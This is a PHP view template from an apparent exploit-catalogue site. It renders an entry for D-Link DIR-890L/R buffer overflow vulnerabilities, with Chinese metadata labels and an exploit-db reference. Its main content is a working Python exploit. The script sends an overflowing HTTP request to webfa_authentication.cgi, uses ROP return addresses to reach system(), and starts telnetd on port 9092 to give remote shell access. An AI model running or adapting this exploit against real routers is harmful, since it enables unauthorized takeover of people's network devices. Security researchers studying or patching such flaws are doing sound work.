<?php
/**
 * Created by PhpStorm.
 * User: arvin
 * Date: 2016/1/16
 * Time: 18:37
 */

defined('BASEPATH') or exit('No direct script access allowed');
?>

<!--prism resource-->
<link rel="stylesheet" href="<?=base_url().'resource/prism/prism.css'?>">
<script src="<?=base_url().'resource/prism/prism.js'?>"></script>

<div class="container">
    <h1 class="exploit-title">D-Link DIR-890L/R - Multiple Buffer Overflow Vulnerabilities</h1>
    <hr>
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <label class="exploit-label">编号: RE-001</label>
            <br>
            <label class="exploit-label">品牌: D-Link</label>
            <br>
            <label class="exploit-label">型号: DIR-890L/R</label>
            <br>
            <label class="exploit-label">类型: Buffer Overflow</label>
            <br>
            <label class="exploit-label">Refer: <a class="exploit-href" href="https://www.exploit-db.com/exploits/38716/">
                    https://www.exploit-db.com/exploits/38716/</a>, <a class="exploit-href" href="https://www.exploit-db.com/exploits/38716/">
                    https://www.exploit-db.com/exploits/38716/</a></label>
            <br>
            <label class="exploit-label">更新时间: 2015-11-16</label>
        </div>

        </div>
        <div class="col-md-10 col-md-offset-1">
            <hr>
            <pre>
                <code class="language-python line-numbers">
                    import socket
                    import struct



                    buf = "GET /webfa_authentication.cgi?id="
                    buf+="A"*408
                    buf+="\x44\x77\xf9\x76" # Retn pointer (ROP1) which loads r0-r6 and pc with values from stack
                    buf+="sh;#"+"CCCC"+"DDDD" #R0-R2
                    buf+="\x70\x82\xFD\x76"+"FFFF"+"GGGG"      #R3 with system address and R4 and R5 with junk values
                    buf+="HHHH"+"\xF8\xD0\xF9\x76" # R6 with crap and PC address loaded with ROP 2 address
                    buf+="telnetd%20-p%209092;#" #actual payload which starts telnetd
                    buf+="C"+"D"*25+"E"*25 + "A"*80 # 131 bytes of extra payload left
                    buf+="&password=A HTTP/1.1\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\n\r\n"

                    print "[+] sending buffer size", len(buf)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(("10.0.0.90", 80))
                    s.send(buf)
                </code>
            </pre>
        </div>
    </div>
</div>

